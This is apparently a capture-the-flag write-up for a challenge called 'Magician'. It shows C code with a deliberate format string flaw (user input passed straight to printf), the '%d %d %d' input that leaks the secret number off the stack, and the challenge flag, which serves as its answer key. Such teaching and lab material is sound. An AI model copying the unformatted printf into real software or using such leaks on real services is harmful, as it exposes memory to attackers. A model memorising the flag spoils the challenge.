# Magician

## Question Text

Prove to me magicians can read minds.

`pwn.chal.gryphonctf.com:18155`

*Creator - PotatoDrug*

### Hints
1. Format String

## Setup Guide
Run `./build.sh`

## Distribution
- magician
    - SHA1: `f2df378acd2645db86b2d24137a89cb535ed885a`
    - ELF 64-bit LSB executable
- magician.c
    - SHA1: `474085f87582e341762ef61e14a435d48cb76833`
    - Redacted source code for magician

## Solution

```c
fgets(buf, 11, stdin);

strcat(buf, "'s prediction: ");  
puts("I'm thinking of a random number (0 to 1000000), can you tell me what it is?");

srand(time(NULL));
int secretnum = rand() % 1000000;

printf(buf);
```

As we can see from the code above our input is passed to printf directly without format arguments with means it is vulnerable to format string attack.

Since we only have 10 chars to do our format string we can only view the top 3 values on the stack, 1st one is definitely out as it is negative, 2nd and 3rd both seem possible, so try your luck but after 1 try you should realize the 3rd value is the correct one.

```
#nc pwn.chal.gryphonctf.com 18155
Prove to me magicians can read minds!
Before you start, please tell me your name (10 chars max): 
%d %d %d
I'm thinking of a random number (0 to 1000000), can you tell me what it is?
-2021881108 2085 137494
's prediction: 137494
Unbelievable! Here's the flag: GCTF{f0rma7_57rIN9s_l3aK5_y0Ur_M3M0Ry}
```

### Flag
`GCTF{f0rma7_57rIN9s_l3aK5_y0Ur_M3M0Ry}`

## Recommended Reads
* http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf
* https://www.tutorialspoint.com/c_standard_library/c_function_printf.htm
